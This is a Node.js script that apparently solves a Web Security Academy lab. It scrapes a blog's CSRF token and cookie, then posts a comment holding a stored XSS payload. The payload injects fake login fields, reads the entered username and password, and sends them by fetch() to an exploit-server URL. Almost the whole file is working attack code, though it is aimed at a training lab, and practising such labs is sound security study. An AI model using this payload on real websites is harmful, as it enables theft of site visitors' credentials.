import axios from "axios";
import { readFile, readFileSync } from "fs";
import parse from "node-html-parser";

const subdomain = "0a5500280386f35ec0822f20005e0049";
const baseURL = `https://${subdomain}.web-security-academy.net/`;
const blogURL = baseURL + "post?postId=3";
const postURL = baseURL + "post/comment";
const exploitServerURL =
  "https://exploit-0ae70066044a25d1c05d47e801ac0053.web-security-academy.net/";

const main = async () => {
  console.log("Injected HTML into: ", blogURL);
  const htmlToBeInjected = readFileSync(
    __dirname + "/injection_html.html",
    "utf-8"
  );
  const blogPageResponse = await axios.get(blogURL);
  const cookie = blogPageResponse.headers["set-cookie"][0].split(";")[0];

  const parsedBlogPageHTML = parse(blogPageResponse.data);
  const csrfToken =
    parsedBlogPageHTML.querySelector('[name="csrf"]').attrs.value;
  console.log("CSRF Token is: ", csrfToken);
  const crossSiteScript = `<script>document.getElementById("academyLabHeader").innerHTML += \`${htmlToBeInjected}\`; window.setTimeout(function(){
        const stolenPassword = document.getElementById("hacked_pass").value; const stolenUsername = document.getElementById("hacked_username").value; fetch("${exploitServerURL}" + stolenPassword + "break" + stolenUsername); alert("This is it:" + stolenPassword);
 }, 5000);</script>`;
  try {
    const response = await axios.post(
      postURL,
      `csrf=${csrfToken}&postId=3&comment=${encodeURIComponent(
        crossSiteScript
      )}&name=Test&email=Test%40gmail.com&website=`,
      {
        //   maxRedirects: 0,
        headers: {
          accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "accept-language": "en-US,en;q=0.9,es;q=0.8",
          "cache-control": "max-age=0",
          "content-type": "application/x-www-form-urlencoded",
          "sec-ch-ua":
            '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"macOS"',
          "sec-fetch-dest": "document",
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "same-origin",
          "sec-fetch-user": "?1",
          "upgrade-insecure-requests": "1",
          cookie,
          // Referer:
          //   "https://0adb00e00495d7bfc05c398c00cf00f6.web-security-academy.net/post?postId=9",
          "Referrer-Policy": "strict-origin-when-cross-origin",
        },
      }
    );
    console.log(response);
  } catch (e) {
    console.log("Encountered error");
    console.log(e);
  }
};

main();
